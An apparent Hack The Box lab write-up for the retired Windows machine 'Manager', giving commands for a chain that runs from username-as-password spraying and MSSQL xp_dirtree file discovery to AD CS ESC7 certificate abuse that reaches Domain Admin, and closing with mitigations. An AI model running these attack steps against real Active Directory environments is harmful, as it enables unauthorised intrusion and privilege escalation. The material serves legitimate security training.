---
machine: Manager
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, mssql, adcs, esc7, privesc]
---

# Manager — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A RID cycle and Kerberos enumerate users; a spray using each username as its password hits `operator`. `operator` accesses MSSQL and `xp_dirtree` reads a web backup with `raven` credentials. `raven` has AD CS rights and the ESC7 misconfiguration allows issuing an Administrator certificate and logging in over WinRM.

## Recon

```bash
nmap -Pn -sCV -p53,80,88,389,445,1433,5985 <IP>
```

- The host is a domain controller: DNS, Kerberos, LDAP, SMB, MSSQL and WinRM.
- The domain is `manager.htb` and the DC is `dc01.manager.htb`.
- `80` serves a corporate site with vhosts.

## Enumeration

- `netexec smb <IP>` obtains the domain name and users through RID cycling.
- Kerberos brute force with `kerbrute` also works.
- A spray with `user:user` validates `operator` credentials.

```bash
netexec smb <IP> -u users.txt -p users.txt --no-brute
```

## Foothold

`operator` can authenticate to MSSQL. Use `xp_dirtree` to list directories and find a web backup; the ZIP contains an old `web.config` with `raven` credentials.

```bash
impacket-mssqlclient manager.htb/operator:'<PASSWORD>'@<IP>
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

## Lateral movement

As `raven`, enumerate AD CS and confirm `ManageCA` or `ManageCertificates` over the CA, the ESC7 condition. Add `raven` as an officer and approve a certificate request with an Administrator SAN.

```bash
certipy-ad find -u raven@manager.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable
certipy-ad ca -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -add-officer raven
```

## Privilege escalation

Request a certificate as Administrator, approve it with the officer role and use PKINIT to get a TGT. `PassTheTicket` then opens WinRM as Administrator.

```bash
certipy-ad req -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -template User -upn administrator@manager.htb
certipy-ad ca -u raven@manager.htb -p '<PASSWORD>' -ca MANAGER-CA -issue-request <ID>
```

## Evidence

- RID cycling and domain users.
- `user:user` spray and `operator` credentials.
- `xp_dirtree` and backup with `raven`.
- ESC7, Administrator certificate and WinRM.

## Lessons learned

- Passwords equal to the username remain common.
- `xp_dirtree` explores the filesystem without `xp_cmdshell`.
- ESC7 turns CA management rights into Domain Admin.

## Mitigation and detection

- Enforce password policies and block sprays.
- Restrict `xp_dirtree` and MSSQL permissions.
- Audit `ManageCA`/`ManageCertificates` and AD CS templates.

## References

- [0xdf — Manager](https://0xdf.gitlab.io/2024/03/16/htb-manager.html)
- [IppSec — Manager](https://www.youtube.com/watch?v=lT2Tv0m4k7M)
- [Hack The Box — Manager](https://app.hackthebox.com/machines/manager)
